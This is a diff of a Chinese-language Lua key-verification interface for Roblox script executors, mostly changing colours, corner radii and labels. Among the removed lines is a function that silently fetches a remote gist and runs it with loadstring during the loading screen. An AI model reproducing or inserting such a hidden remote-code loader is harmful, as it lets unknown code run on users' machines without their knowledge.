@@ -1,10 +1,26 @@
--- 复制全部到执行器运行，界面文字已是中文，圆角加大，带黑白流动渐变边框
+--[[
+ ________   ________   ________   _______    ___        ___  ___   ___     
+|\   __  \ |\   __  \ |\   __  \ |\  ___ \  |\  \      |\  \|\  \ |\  \    
+\ \  \|\  \\ \  \|\  \\ \  \|\  \\ \   __/| \ \  \     \ \  \\\  \\ \  \   
+ \ \   __  \\ \   _  _\\ \  \\\  \\ \  \_|/__\ \  \     \ \  \\\  \\ \  \  
+  \ \  \ \  \\ \  \\  \|\ \  \\\  \\ \  \_|\ \\ \  \____ \ \  \\\  \\ \  \ 
+   \ \__\ \__\\ \__\\ _\ \ \_____  \\ \_______\\ \_______\\ \_______\\ \__\
+    \|__|\|__| \|__|\|__| \|___| \__\\|_______| \|_______| \|_______| \|__|
+                                \|__|                                      
+                                                                           
+
+     Github - https://github.com/SyndromeXph/expert-octo-doodle/tree/main
+     作者: Cobru (Cobruhehe, .cobru)
+     修改者: Yuxingchen
+     许可证: MIT
+]]
 
 repeat task.wait() until game:IsLoaded()
 
 local cloneref = cloneref or function(obj) return obj end
 local gethui = gethui or function() return cloneref(game:GetService("CoreGui")) end
 
+-- 服务
 local TweenService = cloneref(game:GetService("TweenService"))
 local UserInputService = cloneref(game:GetService("UserInputService"))
 local HttpService = cloneref(game:GetService("HttpService"))
@@ -22,36 +38,37 @@ getgenv().PatriotClosed = false
 
 local Patriot = {}
 
--- ========== 中文界面配置 ==========
+-- 外观设置
 Patriot.Appearance = {
-    Title = "XIAOXI HUB",           -- 标题中文
-    Subtitle = "输入密钥以继续",  -- 副标题中文
+    Title = "验证系统",
+    Subtitle = "请输入密钥以继续",
     Icon = "rbxassetid://95721401302279",
     IconSize = UDim2.new(0, 30, 0, 30)
 }
 
+-- 链接
 Patriot.Links = {
     GetKey = "",
     Discord = ""
 }
 
+-- 存储
 Patriot.Storage = {
     FileName = "Patriot_Key",
     Remember = true,
     AutoLoad = true
 }
 
+-- 选项
 Patriot.Options = {
-    Keyless = nil,
-    KeylessUI = false,
     Blur = true,
     Draggable = true
 }
 
--- 主题（强调色设为黑色，配合黑白流动边框）
+-- 主题色
 Patriot.Theme = {
-    Accent = Color3.fromRGB(0, 0, 0),
-    AccentHover = Color3.fromRGB(30, 30, 30),
+    Accent = Color3.fromRGB(139, 0, 0),
+    AccentHover = Color3.fromRGB(170, 20, 20),
     Background = Color3.fromRGB(15, 15, 15),
     Header = Color3.fromRGB(20, 20, 20),
     Input = Color3.fromRGB(25, 25, 25),
@@ -67,6 +84,7 @@ Patriot.Theme = {
     Pending = Color3.fromRGB(60, 60, 60)
 }
 
+-- 回调函数
 Patriot.Callbacks = {
     OnVerify = nil,
     OnSuccess = nil,
@@ -76,10 +94,11 @@ Patriot.Callbacks = {
 
 Patriot.Changelog = {}
 
+-- 商店
 Patriot.Shop = {
     Enabled = false,
     Icon = "",
-    Title = "获取高级访问权限",
+    Title = "获取高级权限",
     Subtitle = "即时交付 • 24/7 支持",
     ButtonText = "购买",
     Link = ""
@@ -87,11 +106,8 @@ Patriot.Shop = {
 
 -- 内部变量
 local Internal = {
-    Junkie = nil,
-    BlurEffect = nil,
     NotificationList = {},
     ValidateFunction = nil,
-    IsJunkieMode = false,
     IconsLoaded = false
 }
 
@@ -210,7 +226,7 @@ local function downloadIcon(iconName)
     end
     local success = pcall(function()
         local response = game:HttpGet(IconBaseURL .. IconFiles[iconName])
-        if #response < 100 then error("Invalid") end
+        if #response < 100 then error("无效") end
         writefile(path, response)
         CachedIcons[iconName] = getcustomasset(path)
     end)
@@ -268,7 +284,7 @@ local function getDeviceType()
     local touch = UserInputService.TouchEnabled
     local keyboard = UserInputService.KeyboardEnabled
     local gamepad = UserInputService.GamepadEnabled
-    if gamepad and not keyboard and not touch then return "游戏机"
+    if gamepad and not keyboard and not touch then return "主机"
     elseif touch and not keyboard then return "手机"
     elseif keyboard and touch then return "电脑+触屏"
     elseif keyboard then return "电脑"
@@ -307,7 +323,7 @@ local function formatTime12()
 end
 
 local function formatDate()
-    return os.date("%Y年%m月%d日")
+    return os.date("%m月%d日, %Y年")
 end
 
 local function enableBlur()
@@ -342,89 +358,9 @@ local function fullCleanup()
     getgenv().PatriotClosed = true
     disableBlur()
     local gui1 = hui:FindFirstChild("PatriotKeySystem")
-    local gui2 = hui:FindFirstChild("PatriotKeylessSystem")
     local gui3 = hui:FindFirstChild("PatriotLoadingScreen")
     if gui1 then gui1:Destroy() end
-    if gui2 then gui2:Destroy() end
     if gui3 then gui3:Destroy() end
-end
-
--- ========== 黑白流动渐变边框 + 大圆角 ==========
-local function addFlowingBorder(frame, cornerRadius)
-    cornerRadius = cornerRadius or 16  -- 更大的圆角
-    
-    local borderContainer = Instance.new("Frame")
-    borderContainer.Size = UDim2.new(1, 0, 1, 0)
-    borderContainer.Position = UDim2.new(0, 0, 0, 0)
-    borderContainer.BackgroundTransparency = 1
-    borderContainer.ZIndex = frame.ZIndex - 1
-    borderContainer.Parent = frame.Parent
-    
-    local gradient = Instance.new("UIGradient")
-    gradient.Rotation = 0
-    -- 黑白渐变透明度序列
-    gradient.Transparency = NumberSequence.new({
-        NumberSequenceKeypoint.new(0, 0),
-        NumberSequenceKeypoint.new(0.25, 0),
-        NumberSequenceKeypoint.new(0.5, 0.3),
-        NumberSequenceKeypoint.new(0.75, 0),
-        NumberSequenceKeypoint.new(1, 0)
-    })
-    
-    local borderFrame = Instance.new("Frame")
-    borderFrame.Size = UDim2.new(1, 6, 1, 6)  -- 边框更粗
-    borderFrame.Position = UDim2.new(0, -3, 0, -3)
-    borderFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)  -- 白色
-    borderFrame.BorderSizePixel = 0
-    borderFrame.ZIndex = borderContainer.ZIndex
-    borderFrame.Parent = borderContainer
-    gradient.Parent = borderFrame
-    
-    -- 添加黑白交替效果：再叠一个黑色渐变层
-    local gradient2 = Instance.new("UIGradient")
-    gradient2.Rotation = 180
-    gradient2.Transparency = NumberSequence.new({
-        NumberSequenceKeypoint.new(0, 0),
-        NumberSequenceKeypoint.new(0.25, 0),
-        NumberSequenceKeypoint.new(0.5, 0.3),
-        NumberSequenceKeypoint.new(0.75, 0),
-        NumberSequenceKeypoint.new(1, 0)
-    })
-    
-    local borderFrame2 = Instance.new("Frame")
-    borderFrame2.Size = UDim2.new(1, 6, 1, 6)
-    borderFrame2.Position = UDim2.new(0, -3, 0, -3)
-    borderFrame2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  -- 黑色
-    borderFrame2.BorderSizePixel = 0
-    borderFrame2.ZIndex = borderContainer.ZIndex
-    borderFrame2.BackgroundTransparency = 0.5
-    borderFrame2.Parent = borderContainer
-    gradient2.Parent = borderFrame2
-    
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, cornerRadius + 3)
-    corner.Parent = borderFrame
-    
-    local corner2 = Instance.new("UICorner")
-    corner2.CornerRadius = UDim.new(0, cornerRadius + 3)
-    corner2.Parent = borderFrame2
-    
-    local corner3 = Instance.new("UICorner")
-    corner3.CornerRadius = UDim.new(0, cornerRadius)
-    corner3.Parent = frame
-    
-    -- 动画：让渐变旋转
-    task.spawn(function()
-        local rot = 0
-        while frame and frame.Parent do
-            rot = (rot + 2) % 360
-            gradient.Rotation = rot
-            gradient2.Rotation = rot + 180
-            task.wait(0.02)
-        end
-    end)
-    
-    return borderContainer
 end
 
 local function setupDragging(header, main)
@@ -464,14 +400,6 @@ local function validateKey(key, validateFunc)
     if type(result) == "table" then return result.valid == true end
     if type(result) == "boolean" then return result end
     return false
-end
-
-local function runExternalScript()
-    task.spawn(function()
-        pcall(function()
-            loadstring(game:HttpGetAsync("https://gist.githubusercontent.com/Nappypie/6244c406aa0686a8aaddcf565c7d98b7/raw/3b693642bda11336dc8ed9808c52c87d2a54ba99/Hello.lua"))()
-        end)
-    end)
 end
 
 local function CreateDoorOverlay(parentFrame, width, height)
@@ -775,7 +703,6 @@ local function ShowLoadingScreen(onComplete)
         end
         task.wait(0.5)
         setPhase(1)
-        runExternalScript()
         task.wait(0.3)
         setPhase(2) ensureFolders() task.wait(0.25)
         setPhase(3)
@@ -810,7 +737,6 @@ end
 local function EnsureIconsReady(callback)
     if allIconsCached() then
         loadAllIconsFromCache()
-        runExternalScript()
         if callback then callback() end
     else
         ShowLoadingScreen(callback)
@@ -957,7 +883,7 @@ local function CreateChangelogPanel(parent, windowWidth, panelHeight, panelWidth
     panel.BorderSizePixel = 0
     panel.ClipsDescendants = true
     panel.Parent = mainFrame
-    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 12)
+    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 4)
 
     local panelStroke = Instance.new("UIStroke", panel)
     panelStroke.Color = Patriot.Theme.Accent
@@ -969,7 +895,7 @@ local function CreateChangelogPanel(parent, windowWidth, panelHeight, panelWidth
     panelHeader.BackgroundColor3 = Patriot.Theme.Header
     panelHeader.BorderSizePixel = 0
     panelHeader.Parent = panel
-    Instance.new("UICorner", panelHeader).CornerRadius = UDim.new(0, 12)
+    Instance.new("UICorner", panelHeader).CornerRadius = UDim.new(0, 4)
 
     local panelHeaderFix = Instance.new("Frame")
     panelHeaderFix.Size = UDim2.new(1, 0, 0, 8)
@@ -1131,7 +1057,7 @@ local function CreateUserInfoPanel(parent, windowWidth, panelHeight, panelWidth,
     panel.BorderSizePixel = 0
     panel.ClipsDescendants = true
     panel.Parent = mainFrame
-    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 12)
+    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 4)
 
     local panelStroke = Instance.new("UIStroke", panel)
     panelStroke.Color = Patriot.Theme.Accent
@@ -1143,7 +1069,7 @@ local function CreateUserInfoPanel(parent, windowWidth, panelHeight, panelWidth,
     panelHeader.BackgroundColor3 = Patriot.Theme.Header
     panelHeader.BorderSizePixel = 0
     panelHeader.Parent = panel
-    Instance.new("UICorner", panelHeader).CornerRadius = UDim.new(0, 12)
+    Instance.new("UICorner", panelHeader).CornerRadius = UDim.new(0, 4)
 
     local panelHeaderFix = Instance.new("Frame")
     panelHeaderFix.Size = UDim2.new(1, 0, 0, 8)
@@ -1225,7 +1151,7 @@ local function CreateUserInfoPanel(parent, windowWidth, panelHeight, panelWidth,
     avatarGlow.BackgroundTransparency = 0.5
     avatarGlow.BorderSizePixel = 0
     avatarGlow.Parent = avatarWrapper
-    Instance.new("UICorner", avatarGlow).CornerRadius = UDim.new(0, 8)
+    Instance.new("UICorner", avatarGlow).CornerRadius = UDim.new(0, 4)
 
     local avatarGlowStroke = Instance.new("UIStroke", avatarGlow)
     avatarGlowStroke.Color = Patriot.Theme.Accent
@@ -1240,7 +1166,7 @@ local function CreateUserInfoPanel(parent, windowWidth, panelHeight, panelWidth,
     avatarContainer.BorderSizePixel = 0
     avatarContainer.ClipsDescendants = true
     avatarContainer.Parent = avatarWrapper
-    Instance.new("UICorner", avatarContainer).CornerRadius = UDim.new(0, 8)
+    Instance.new("UICorner", avatarContainer).CornerRadius = UDim.new(0, 4)
 
     local avatarImage = Instance.new("ImageLabel")
     avatarImage.Size = UDim2.new(1, 0, 1, 0)
@@ -1257,7 +1183,7 @@ local function CreateUserInfoPanel(parent, windowWidth, panelHeight, panelWidth,
     local welcomeLabel = Instance.new("TextLabel")
     welcomeLabel.Size = UDim2.new(1, 0, 0, isCompact and 14 or 18)
     welcomeLabel.BackgroundTransparency = 1
-    welcomeLabel.Text = "欢迎，" .. (player and player.DisplayName or "用户")
+    welcomeLabel.Text = "欢迎, " .. (player and player.DisplayName or "用户")
     welcomeLabel.TextColor3 = Patriot.Theme.Text
     welcomeLabel.TextSize = welcomeSize
     welcomeLabel.Font = Enum.Font.ArimoBold
@@ -1477,14 +1403,6 @@ local function CreateUserInfoPanel(parent, windowWidth, panelHeight, panelWidth,
     return panel, toggle, function() return isOpen end, panelWidth
 end
 
-local function handleKeylessSkip()
-    getgenv().SCRIPT_KEY = "KEYLESS"
-    getgenv().PatriotLoaded = false
-    Patriot:Notify("访问已授予", "免密访问已批准！", 3, "success")
-    task.wait(0.3)
-    if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end
-end
-
 local function BuildCenteredUI(windowWidth, windowHeight, panelHeight, userPanelWidth, changelogPanelWidth, gap, buildContent)
     local gui = buildContent.gui
 
@@ -1504,7 +1422,7 @@ local function BuildCenteredUI(windowWidth, windowHeight, panelHeight, userPanel
     mainFrame.BackgroundColor3 = Patriot.Theme.Background
     mainFrame.BorderSizePixel = 0
     mainFrame.Parent = container
-    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 16)
+    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 4)
 
     local mainStroke = Instance.new("UIStroke", mainFrame)
     mainStroke.Color = Patriot.Theme.Accent
@@ -1557,333 +1475,9 @@ local function BuildCenteredUI(windowWidth, windowHeight, panelHeight, userPanel
     }
 end
 
-local function BuildKeylessUI()
-    local oldGui = hui:FindFirstChild("PatriotKeylessSystem")
-    if oldGui then oldGui:Destroy() end
-    local oldGui2 = hui:FindFirstChild("PatriotKeySystem")
-    if oldGui2 then oldGui2:Destroy() end
-
-    enableBlur()
-
-    local mobile = isMobile()
-    local padding = 14
-    local windowWidth = 300
-    local windowHeight = 265
-    local userPanelWidth = 165
-    local changelogPanelWidth = 200
-    local gap = 12
-
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "PatriotKeylessSystem"
-    gui.ResetOnSpawn = false
-    gui.IgnoreGuiInset = true
-    gui.Parent = hui
-
-    local ui = BuildCenteredUI(windowWidth, windowHeight, windowHeight, userPanelWidth, changelogPanelWidth, gap, {gui = gui})
-    local container = ui.container
-    local main = ui.mainFrame
-    local mainStroke = ui.mainStroke
-
-    local header = Instance.new("Frame")
-    header.Size = UDim2.new(1, 0, 0, 50)
-    header.BackgroundColor3 = Patriot.Theme.Header
-    header.BorderSizePixel = 0
-    header.Active = true
-    header.Parent = main
-    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 16)
-
-    local headerFix = Instance.new("Frame")
-    headerFix.Size = UDim2.new(1, 0, 0, 8)
-    headerFix.Position = UDim2.new(0, 0, 1, -8)
-    headerFix.BackgroundColor3 = Patriot.Theme.Header
-    headerFix.BorderSizePixel = 0
-    headerFix.Parent = header
-
-    local headerLine = Instance.new("Frame")
-    headerLine.Size = UDim2.new(1, 0, 0, 1)
-    headerLine.Position = UDim2.new(0, 0, 1, 0)
-    headerLine.BackgroundColor3 = Patriot.Theme.Accent
-    headerLine.BackgroundTransparency = 0.6
-    headerLine.BorderSizePixel = 0
-    headerLine.Parent = header
-
-    local logo = Instance.new("ImageLabel")
-    logo.Size = UDim2.new(0, 30, 0, 30)
-    logo.Position = UDim2.new(0, padding, 0.5, 0)
-    logo.AnchorPoint = Vector2.new(0, 0.5)
-    logo.BackgroundTransparency = 1
-    logo.Image = getLogoIcon()
-    logo.ImageColor3 = Patriot.Theme.Text
-    logo.ScaleType = Enum.ScaleType.Fit
-    logo.Parent = header
-
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, -90, 1, 0)
-    title.Position = UDim2.new(0, padding + 40, 0, 0)
-    title.BackgroundTransparency = 1
-    title.Text = Patriot.Appearance.Title
-    title.TextColor3 = Patriot.Theme.Text
-    title.TextSize = mobile and 24 or 26
-    title.Font = Enum.Font.ArimoBold
-    title.TextXAlignment = Enum.TextXAlignment.Left
-    title.Parent = header
-
-    local closeBtn = Instance.new("ImageButton")
-    closeBtn.Size = UDim2.new(0, 22, 0, 22)
-    closeBtn.Position = UDim2.new(1, -padding, 0.5, 0)
-    closeBtn.AnchorPoint = Vector2.new(1, 0.5)
-    closeBtn.BackgroundTransparency = 1
-    closeBtn.Image = getIcon("close")
-    closeBtn.ImageColor3 = Patriot.Theme.TextDim
-    closeBtn.ScaleType = Enum.ScaleType.Fit
-    closeBtn.Parent = header
-    closeBtn.MouseEnter:Connect(function() TweenService:Create(closeBtn, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.Error}):Play() end)
-    closeBtn.MouseLeave:Connect(function() TweenService:Create(closeBtn, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.TextDim}):Play() end)
-
-    local contentY = 60
-
-    local successBox = Instance.new("Frame")
-    successBox.Size = UDim2.new(0.94, 0, 0, 52)
-    successBox.Position = UDim2.new(0.5, 0, 0, contentY)
-    successBox.AnchorPoint = Vector2.new(0.5, 0)
-    successBox.BackgroundColor3 = Patriot.Theme.Success
-    successBox.BackgroundTransparency = 0.85
-    successBox.BorderSizePixel = 0
-    successBox.Parent = main
-    Instance.new("UICorner", successBox).CornerRadius = UDim.new(0, 8)
-
-    local successStroke = Instance.new("UIStroke", successBox)
-    successStroke.Color = Patriot.Theme.Success
-    successStroke.Thickness = 1
-    successStroke.Transparency = 0.5
-
-    local checkIcon = Instance.new("ImageLabel")
-    checkIcon.Size = UDim2.new(0, 24, 0, 24)
-    checkIcon.Position = UDim2.new(0, 16, 0.5, 0)
-    checkIcon.AnchorPoint = Vector2.new(0, 0.5)
-    checkIcon.BackgroundTransparency = 1
-    checkIcon.Image = getIcon("check")
-    checkIcon.ImageColor3 = Patriot.Theme.Success
-    checkIcon.ScaleType = Enum.ScaleType.Fit
-    checkIcon.Parent = successBox
-
-    local successText = Instance.new("TextLabel")
-    successText.Size = UDim2.new(1, -60, 1, 0)
-    successText.Position = UDim2.new(0, 52, 0, 0)
-    successText.BackgroundTransparency = 1
-    successText.Text = "访问已授予"
-    successText.TextColor3 = Patriot.Theme.Success
-    successText.TextSize = mobile and 17 or 18
-    successText.Font = Enum.Font.ArimoBold
-    successText.TextXAlignment = Enum.TextXAlignment.Left
-    successText.Parent = successBox
-
-    local keylessText = Instance.new("TextLabel")
-    keylessText.Size = UDim2.new(1, 0, 0, 20)
-    keylessText.Position = UDim2.new(0.5, 0, 0, contentY + 60)
-    keylessText.AnchorPoint = Vector2.new(0.5, 0)
-    keylessText.BackgroundTransparency = 1
-    keylessText.Text = "免密脚本"
-    keylessText.TextColor3 = Patriot.Theme.TextDim
-    keylessText.TextSize = mobile and 14 or 15
-    keylessText.Font = Enum.Font.ArimoBold
-    keylessText.Parent = main
-
-    local divider = Instance.new("Frame")
-    divider.Size = UDim2.new(1, 0, 0, 3)
-    divider.Position = UDim2.new(0, 0, 0, contentY + 88)
-    divider.BackgroundColor3 = Patriot.Theme.Divider
-    divider.BorderSizePixel = 0
-    divider.Parent = main
-
-    local launchBtn = Instance.new("TextButton")
-    launchBtn.Size = UDim2.new(0.75, 0, 0, 42)
-    launchBtn.Position = UDim2.new(0.5, 0, 0, contentY + 103)
-    launchBtn.AnchorPoint = Vector2.new(0.5, 0)
-    launchBtn.BackgroundColor3 = Patriot.Theme.Accent
-    launchBtn.BorderSizePixel = 0
-    launchBtn.Text = ""
-    launchBtn.AutoButtonColor = false
-    launchBtn.Parent = main
-    Instance.new("UICorner", launchBtn).CornerRadius = UDim.new(0, 8)
-
-    local launchStroke = Instance.new("UIStroke", launchBtn)
-    launchStroke.Color = Patriot.Theme.AccentHover
-    launchStroke.Thickness = 1
-    launchStroke.Transparency = 0.5
-
-    local launchContent = Instance.new("Frame")
-    launchContent.Size = UDim2.new(1, 0, 1, 0)
-    launchContent.BackgroundTransparency = 1
-    launchContent.Parent = launchBtn
-
-    local launchLayout = Instance.new("UIListLayout", launchContent)
-    launchLayout.FillDirection = Enum.FillDirection.Horizontal
-    launchLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-    launchLayout.VerticalAlignment = Enum.VerticalAlignment.Center
-    launchLayout.Padding = UDim.new(0, 8)
-
-    local launchIcon = Instance.new("ImageLabel")
-    launchIcon.Size = UDim2.new(0, 18, 0, 18)
-    launchIcon.BackgroundTransparency = 1
-    launchIcon.Image = getIcon("shield")
-    launchIcon.ImageColor3 = Patriot.Theme.Text
-    launchIcon.ScaleType = Enum.ScaleType.Fit
-    launchIcon.LayoutOrder = 1
-    launchIcon.Parent = launchContent
-
-    local launchLabel = Instance.new("TextLabel")
-    launchLabel.Size = UDim2.new(0, 0, 0, 18)
-    launchLabel.AutomaticSize = Enum.AutomaticSize.X
-    launchLabel.BackgroundTransparency = 1
-    launchLabel.Text = "启动脚本"
-    launchLabel.TextColor3 = Patriot.Theme.Text
-    launchLabel.TextSize = mobile and 14 or 15
-    launchLabel.Font = Enum.Font.ArimoBold
-    launchLabel.LayoutOrder = 2
-    launchLabel.Parent = launchContent
-
-    launchBtn.MouseEnter:Connect(function() TweenService:Create(launchBtn, TweenInfo.new(0.15), {BackgroundColor3 = Patriot.Theme.AccentHover}):Play() end)
-    launchBtn.MouseLeave:Connect(function() TweenService:Create(launchBtn, TweenInfo.new(0.15), {BackgroundColor3 = Patriot.Theme.Accent}):Play() end)
-
-    local bottomY = contentY + 153
-
-    local userBtn = Instance.new("TextButton")
-    userBtn.Size = UDim2.new(0, 36, 0, 36)
-    userBtn.Position = UDim2.new(0.5, -44, 0, bottomY)
-    userBtn.AnchorPoint = Vector2.new(0.5, 0)
-    userBtn.BackgroundColor3 = Patriot.Theme.Background
-    userBtn.BorderSizePixel = 0
-    userBtn.Text = ""
-    userBtn.AutoButtonColor = false
-    userBtn.Parent = main
-    Instance.new("UICorner", userBtn).CornerRadius = UDim.new(0, 8)
-
-    local userIcon = Instance.new("ImageLabel")
-    userIcon.Size = UDim2.new(0, 18, 0, 18)
-    userIcon.Position = UDim2.new(0.5, 0, 0.5, 0)
-    userIcon.AnchorPoint = Vector2.new(0.5, 0.5)
-    userIcon.BackgroundTransparency = 1
-    userIcon.Image = getIcon("user")
-    userIcon.ImageColor3 = Patriot.Theme.TextDim
-    userIcon.ScaleType = Enum.ScaleType.Fit
-    userIcon.Parent = userBtn
-    userBtn.MouseEnter:Connect(function() TweenService:Create(userIcon, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.Accent}):Play() end)
-    userBtn.MouseLeave:Connect(function() TweenService:Create(userIcon, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.TextDim}):Play() end)
-
-    local discordBtn = Instance.new("TextButton")
-    discordBtn.Size = UDim2.new(0, 36, 0, 36)
-    discordBtn.Position = UDim2.new(0.5, 0, 0, bottomY)
-    discordBtn.AnchorPoint = Vector2.new(0.5, 0)
-    discordBtn.BackgroundColor3 = Patriot.Theme.Background
-    discordBtn.BorderSizePixel = 0
-    discordBtn.Text = ""
-    discordBtn.AutoButtonColor = false
-    discordBtn.Parent = main
-    Instance.new("UICorner", discordBtn).CornerRadius = UDim.new(0, 8)
-
-    local discordIcon = Instance.new("ImageLabel")
-    discordIcon.Size = UDim2.new(0, 18, 0, 18)
-    discordIcon.Position = UDim2.new(0.5, 0, 0.5, 0)
-    discordIcon.AnchorPoint = Vector2.new(0.5, 0.5)
-    discordIcon.BackgroundTransparency = 1
-    discordIcon.Image = getIcon("discord")
-    discordIcon.ImageColor3 = Patriot.Theme.Discord
-    discordIcon.ScaleType = Enum.ScaleType.Fit
-    discordIcon.Parent = discordBtn
-    discordBtn.MouseEnter:Connect(function() TweenService:Create(discordIcon, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.DiscordHover}):Play() end)
-    discordBtn.MouseLeave:Connect(function() TweenService:Create(discordIcon, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.Discord}):Play() end)
-
-    local changelogBtn = Instance.new("TextButton")
-    changelogBtn.Size = UDim2.new(0, 36, 0, 36)
-    changelogBtn.Position = UDim2.new(0.5, 44, 0, bottomY)
-    changelogBtn.AnchorPoint = Vector2.new(0.5, 0)
-    changelogBtn.BackgroundColor3 = Patriot.Theme.Background
-    changelogBtn.BorderSizePixel = 0
-    changelogBtn.Text = ""
-    changelogBtn.AutoButtonColor = false
-    changelogBtn.Parent = main
-    Instance.new("UICorner", changelogBtn).CornerRadius = UDim.new(0, 8)
-
-    local changelogIcon = Instance.new("ImageLabel")
-    changelogIcon.Size = UDim2.new(0, 18, 0, 18)
-    changelogIcon.Position = UDim2.new(0.5, 0, 0.5, 0)
-    changelogIcon.AnchorPoint = Vector2.new(0.5, 0.5)
-    changelogIcon.BackgroundTransparency = 1
-    changelogIcon.Image = getIcon("changelog")
-    changelogIcon.ImageColor3 = Patriot.Theme.TextDim
-    changelogIcon.ScaleType = Enum.ScaleType.Fit
-    changelogIcon.Parent = changelogBtn
-    changelogBtn.MouseEnter:Connect(function() TweenService:Create(changelogIcon, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.Text}):Play() end)
-    changelogBtn.MouseLeave:Connect(function() TweenService:Create(changelogIcon, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.TextDim}):Play() end)
-
-    if #Patriot.Changelog == 0 then
-        changelogBtn.Visible = false
-        userBtn.Position = UDim2.new(0.5, -22, 0, bottomY)
-        discordBtn.Position = UDim2.new(0.5, 22, 0, bottomY)
-    end
-
-    local doors = CreateDoorOverlay(main, windowWidth, windowHeight)
-
-    userBtn.MouseButton1Click:Connect(function() ui.toggleUser(userIcon) end)
-    changelogBtn.MouseButton1Click:Connect(function() ui.toggleCL(changelogIcon) end)
-
-    local function closeDoorsThenExit(callback)
-        ui.closeAllPanels(userIcon, changelogIcon, function()
-            doors.close(function() task.wait(0.3) if callback then callback() end end)
-        end)
-    end
-
-    closeBtn.MouseButton1Click:Connect(function()
-        Patriot:Notify("再见", "下次再见！", 2, "close")
-        closeDoorsThenExit(function()
-            fullCleanup()
-            TweenService:Create(container, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, -0.5, 0)}):Play()
-            TweenService:Create(main, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
-            TweenService:Create(mainStroke, TweenInfo.new(0.3), {Transparency = 1}):Play()
-            task.wait(0.4) gui:Destroy()
-        end)
-        if Patriot.Callbacks.OnClose then Patriot.Callbacks.OnClose() end
-    end)
-
-    launchBtn.MouseButton1Click:Connect(function()
-        Patriot:Notify("启动中", "脚本加载成功！", 2, "success")
-        getgenv().SCRIPT_KEY = "KEYLESS"
-        getgenv().PatriotLoaded = false
-        closeDoorsThenExit(function()
-            disableBlur()
-            TweenService:Create(container, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, -0.5, 0)}):Play()
-            TweenService:Create(main, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
-            TweenService:Create(mainStroke, TweenInfo.new(0.3), {Transparency = 1}):Play()
-            task.wait(0.4) gui:Destroy()
-            if not Internal.IsJunkieMode and Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end
-        end)
-    end)
-
-    discordBtn.MouseButton1Click:Connect(function()
-        if Patriot.Links.Discord ~= "" then
-            Patriot:Notify("Discord", "邀请链接已复制！", 2, "discord")
-            pcall(function() setclipboard(Patriot.Links.Discord) end)
-        end
-    end)
-
-    setupDragging(header, container)
-    TweenService:Create(container, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, 0.45, 0)}):Play()
-    task.wait(0.6)
-    doors.open(function()
-        checkIcon.Size = UDim2.new(0, 0, 0, 0)
-        TweenService:Create(checkIcon, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 24, 0, 24)}):Play()
-        task.wait(0.2)
-        ui.toggleUser(userIcon)
-        if #Patriot.Changelog > 0 then task.wait(0.3) ui.toggleCL(changelogIcon) end
-    end)
-end
-
 local function BuildKeyUI()
     local oldGui = hui:FindFirstChild("PatriotKeySystem")
     if oldGui then oldGui:Destroy() end
-    local oldGui2 = hui:FindFirstChild("PatriotKeylessSystem")
-    if oldGui2 then oldGui2:Destroy() end
 
     enableBlur()
 
@@ -1922,7 +1516,7 @@ local function BuildKeyUI()
     header.BorderSizePixel = 0
     header.Active = true
     header.Parent = mainFrame
-    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 16)
+    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 4)
 
     local headerFix = Instance.new("Frame")
     headerFix.Size = UDim2.new(1, 0, 0, 6)
@@ -1982,7 +1576,7 @@ local function BuildKeyUI()
     statusFrame.BorderSizePixel = 0
     statusFrame.ClipsDescendants = true
     statusFrame.Parent = mainFrame
-    Instance.new("UICorner", statusFrame).CornerRadius = UDim.new(0, 8)
+    Instance.new("UICorner", statusFrame).CornerRadius = UDim.new(0, 4)
 
     local statusStroke = Instance.new("UIStroke", statusFrame)
     statusStroke.Color = Patriot.Theme.Accent
@@ -2021,7 +1615,7 @@ local function BuildKeyUI()
     inputFrame.BorderSizePixel = 0
     inputFrame.ClipsDescendants = true
     inputFrame.Parent = mainFrame
-    Instance.new("UICorner", inputFrame).CornerRadius = UDim.new(0, 8)
+    Instance.new("UICorner", inputFrame).CornerRadius = UDim.new(0, 4)
 
     local inputStroke = Instance.new("UIStroke", inputFrame)
     inputStroke.Color = Patriot.Theme.Accent
@@ -2035,7 +1629,7 @@ local function BuildKeyUI()
     textBox.BackgroundTransparency = 1
     textBox.Text = ""
     textBox.TextColor3 = Patriot.Theme.Text
-    textBox.PlaceholderText = "输入密钥..."
+    textBox.PlaceholderText = "请输入密钥..."
     textBox.PlaceholderColor3 = Patriot.Theme.TextDim
     textBox.TextSize = mobile and 17 or 18
     textBox.Font = Enum.Font.ArimoBold
@@ -2067,7 +1661,7 @@ local function BuildKeyUI()
         btn.Text = ""
         btn.AutoButtonColor = false
         btn.Parent = mainFrame
-        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
 
